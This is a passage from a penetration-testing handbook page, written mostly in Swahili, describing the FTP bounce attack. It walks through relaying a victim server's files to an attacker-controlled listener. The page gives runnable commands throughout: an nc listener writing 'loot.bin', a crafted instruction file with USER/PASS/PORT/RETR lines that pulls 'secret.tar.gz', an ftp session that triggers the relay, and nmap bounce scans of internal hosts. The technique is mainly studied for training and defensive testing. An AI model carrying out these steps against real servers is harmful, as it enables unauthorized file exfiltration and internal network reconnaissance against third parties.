# FTP Bounce Download 2 of FTP File

{{#include ../../banners/hacktricks-training.md}}


## Muhtasari

Kama una ufikiaji wa **bounce FTP server**, unaweza kuifanya iombe faili kutoka kwa **another FTP server** (ambapo unajua baadhi ya credentials) na kupakua faili hiyo kwenye **server yako mwenyewe**.

## Mahitaji

- FTP valid credentials katika **FTP Middle server**
- FTP valid credentials katika **Victim FTP server**
- Zote server zinakubali **`PORT` command** (bounce FTP attack)
- Unaweza **write** ndani ya saraka fulani ya **FTP Middle server**
- The middle server ina **more access** ndani ya **Victim FTP server** kuliko wewe

## Hatua

1. Ungana na **your own FTP server** na fanya muunganisho passive (`pasv` command) ili itasikiliza katika saraka ambapo huduma ya Victim itatumia kutuma faili.
2. Tengeneza faili ambayo **FTP Middle server** itamtuma kwa **Victim server** (the **exploit script**). Faili hili litakuwa plain text lenye amri zinazohitajika ku-authenticate dhidi ya Victim server, kubadilisha saraka na kupakua faili kwenye server yako mwenyewe.
3. Ungana na **FTP Middle Server** na upload faili uliotengeneza.
4. Fanya **FTP Middle server** **establish a connection** na Victim server na itume faili ya exploit.
5. **Capture** faili hiyo kwenye server yako ya FTP.
6. **Delete** faili ya exploit kutoka FTP Middle server.

## Ukaguzi wa haraka kwa bounce hosts zilizo hatarini

- **Nmap** bado inaunga mkono FTP bounce checks. Mfano kuthibitisha potential FTP Middle server:
```bash
nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>
# or directly attempt a bounce scan
nmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>
```
Ikiwa server inakataa thamani za `PORT` za wahusika wa tatu, skani itashindwa; baadhi ya **embedded/legacy printers, NAS na appliance FTP daemons** bado zinaruhusu.

## Otomatisha upakuaji wa pili wa FTP

Hapa chini ni njia iliyoboreshwa ya kushusha faili kupitia seva ya kati ya FTP yenye udhaifu.

1. **Fungua listener ya passive** kwenye mashine yako ya kushambulia (kila TCP sink inafanya kazi):
```bash
nc -lvnp 2121 > loot.bin  # or run a small pyftpdlib server
```

2. **Tambua** IP yako kama `A,B,C,D` na port `P` kama `p1,p2` (`p1 = P/256`, `p2 = P%256`).

3. **Jenga faili la maagizo** ambalo seva ya kati italirudia kwa mhanga:
```bash
cat > instrs <<'EOF'
USER <victim_user>
PASS <victim_pass>
CWD /path/inside/victim
TYPE I
PORT A,B,C,D,p1,p2
RETR secret.tar.gz
QUIT
EOF
# Add padding so the control channel stays open on picky daemons
dd if=/dev/zero bs=1024 count=60 >> instrs
```

4. **Pakia & chochea kutoka seva ya kati** (classic proxy FTP):
```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
put instrs
PORT <victim_ip_with_commas>,0,21
RETR instrs
QUIT
EOF
```

5. **Chukua faili** kutoka listener yako (`loot.bin`).
6. **Safisha** faili iliyopakuliwa `instrs` kwenye seva ya kati.

Vidokezo:
- Padding (`dd ...`) inazuia muunganisho wa udhibiti kufungwa kabla ya RETR kumalizika (tatizo la dirisha kubwa la TCP linalojadiliwa katika maandishi ya zamani).
- Huduma yoyote ambayo inaweza **kusikiliza na kuchoma TCP** inaweza kuchukua nafasi ya socket ya FTP PASV (mfano, `socat -u TCP-LISTEN:2121,fork - > loot.bin`).
- Ikiwa seva ya kati inapiga marufuku ports za kipaumbele, tumia port ya juu katika `PORT` na rekebisha listener yako ipasavyo.

## Mbinu za ziada

- Tumia seva ya FTP inayoweza ku-bounce kufanya **port-scan hosts za ndani** wakati relay ya faili imezuiwa:
```bash
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```
- Baadhi ya WAF/IDS za kisasa (mfano, Juniper IPS) zina signatures mahsusi kwa **FTP:EXPLOIT:BOUNCE-ATTACK**; payloads zenye kelele au ukosefu wa padding zinaweza kusababisha kutambuliwa.
- Wakati seva ya kati inapoweka vikwazo vya "PORT to same host", weka **listener yako kwenye seva ya kati yenyewe** (ikiwa una haki za kuandika/kutekeleza) na pielke faili iliyoshikiliwa baadaye.

Kwa maelezo ya kina ya njia za zamani angalia: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)




## References

- [Nmap book – TCP FTP Bounce Scan (-b)](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [CPTS Attacking Common Services – FTP Bounce example (2025)](https://www.chaostudy.com/2025/02/24/cpts-attacking-common-services/)
{{#include ../../banners/hacktricks-training.md}}
